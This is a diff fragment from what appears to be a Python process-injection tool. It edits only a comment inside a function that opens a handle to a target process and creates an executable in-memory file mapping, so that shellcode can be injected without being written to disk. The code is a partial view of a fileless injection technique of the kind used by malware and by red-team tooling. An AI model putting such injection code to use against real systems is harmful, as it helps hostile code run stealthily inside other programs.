@@ -149,7 +149,7 @@ def shellcodeInjectMapping(pid, verbose):
         utils.dbgPrint("[-] Couldn't get handle to PID: %s" % pid, Fore.RED)
         return False
 
-    # Create a file mapping object so the shellcode doesn't have to be put on disk. This is achieved by using INVALID_HANDLE_VALUE as the first parameter.
+    # Create a file mapping object so the shellcode doesn't have to be put on the disk. This is achieved by using INVALID_HANDLE_VALUE as the first parameter.
     hFileMap = kernel32.CreateFileMappingA(INVALID_HANDLE_VALUE, None, PAGE_EXECUTE_READWRITE, 0, len(shellcode), None)
     if not hFileMap:
         utils.dbgPrint("[-] CreateFileMapping failed with error: %s" % kernel32.GetLastError(), Fore.RED)
